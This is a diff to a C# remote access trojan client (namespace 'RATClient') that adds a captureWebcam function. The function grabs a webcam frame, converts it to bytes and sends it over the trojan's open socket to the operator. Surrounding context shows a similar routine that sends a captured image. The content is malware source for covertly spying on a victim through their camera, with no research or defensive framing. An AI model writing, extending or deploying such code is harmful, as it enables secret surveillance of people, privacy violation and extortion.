@@ -220,6 +220,17 @@ namespace RATClient
             Console.WriteLine("Send completed.");
             img.Dispose();
         }
+        static void captureWebcam()
+        {
+            WebCamService.Capture capture = new WebCamService.Capture();
+            capture.Start();
+            IntPtr image = capture.GetBitMap();
+            Bitmap imageBitmap = new Bitmap(capture.Width, capture.Height, capture.Stride, PixelFormat.DontCare, image);
+            ImageConverter converter = new ImageConverter();
+            byte[] imgBytes = (byte[])converter.ConvertTo(imageBitmap, typeof(byte[]));
+            openSock.Send(imgBytes);
+            capture.Dispose();
+        }
         static void Main(string[] args)
         {
             while (true)
